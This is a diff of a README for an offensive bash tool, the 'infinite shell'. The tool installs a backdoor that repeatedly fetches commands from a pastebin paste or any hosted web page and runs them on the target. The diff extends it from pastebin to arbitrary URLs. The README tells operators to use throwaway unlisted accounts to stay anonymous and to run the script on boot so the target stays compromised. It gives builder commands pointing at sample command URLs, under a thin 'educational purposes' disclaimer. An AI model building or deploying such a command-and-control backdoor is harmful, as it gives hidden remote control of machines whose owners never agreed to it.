@@ -7,7 +7,7 @@ Note that this project is for **educational purposes** only. I bear no responsib
 The aim of this shell is the give the penetration tester maximum and complete control over the system such that **only a reboot** can save the day. Infact if one has root access, one can set the script to run on boot, that way, the target is **screwed**.
 
 # How it works
-Here, you will have a shell that keeps checking on a paste on pastebin (use a throw away account and make the paste unlisted), and running whatever command it finds there. That way, you don't need access to the target machine. You've created a poor man's reverse shell, while remaining anonymous in the process.
+Here, you will have a shell that keeps checking on a paste on a predefined url or pastebin (use a throw away account and make the paste unlisted), and running whatever command it finds there. That way, you don't need access to the target machine. You've created a poor man's reverse shell, while remaining anonymous in the process.
 
 Anytime you need to run a command, simply edit the paste to the command you want.
 
@@ -19,13 +19,18 @@ There are two ways to build the final product.
 - Using your pastebin dev api key, username, and password
 
 
-## Using a raw paste url
+## Using a raw url
 
-This is when you have already created a paste by hand. Get the **raw paste url** and run the following command
+This is when you already have a webpage or have already created a paste by hand. Get the **raw paste url** or the url or the page and run the following command
 
 ```bash
 bash infish-builder url pastebin.com/raw/abc123
 ```
+
+```bash
+bash infish-builder url somesite.com/cmdpage
+```
+**You can also use this is you have a url you host on the internet**.
 
 ## Using your pastebin details
 
@@ -46,7 +51,7 @@ doe
 New paste name:
 shell
 
-Successfully build infinite shell
+Successfully built infinite shell
 
 ```
 
